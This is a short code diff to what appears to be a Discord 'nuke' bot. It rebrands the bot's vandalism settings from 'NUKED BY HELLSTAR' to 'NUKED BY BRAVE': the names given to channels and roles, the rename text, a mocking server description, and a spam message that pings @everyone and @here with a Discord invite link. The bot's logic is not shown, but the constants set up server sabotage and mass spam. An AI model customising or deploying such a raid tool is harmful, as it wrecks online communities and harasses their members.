@@ -16,10 +16,10 @@ const client = new Client({
 
 const PREFIX = '!';
 const LOG_CHANNEL_ID = '1518813932909760532';
-const NUKE_CHANNEL_NAME = 'NUKED BY HELLSTAR';
-const NUKE_ROLE_NAME = 'NUKED BY HELLSTAR';
-const RENAME_TEXT = 'NUKED BY HELLSTAR';
-const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/hellstarrp ||`;
+const NUKE_CHANNEL_NAME = 'NUKED BY BRAVE';
+const NUKE_ROLE_NAME = 'NUKED BY BRAVE';
+const RENAME_TEXT = 'NUKED BY BRAVE';
+const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/R7bTQbE9BW ||`;
 const ICON_URL = 'https://cdn.discordapp.com/attachments/1518813932909760532/1518814085888741376/effb12e066db52fa694d5f9545387c5a.jpg?ex=6a3b4958&is=6a39f7d8&hm=7cd4a3c4810dbecf5e2bc8be2c612f7f53a49d24a68fb955c0b9dca87b1792b5&';
 const SERVER_DESCRIPTION = 'HAHAHAHAHAHAHAH';
 const TARGET_VOICE_CHANNEL_ID = '1515317424323428398';
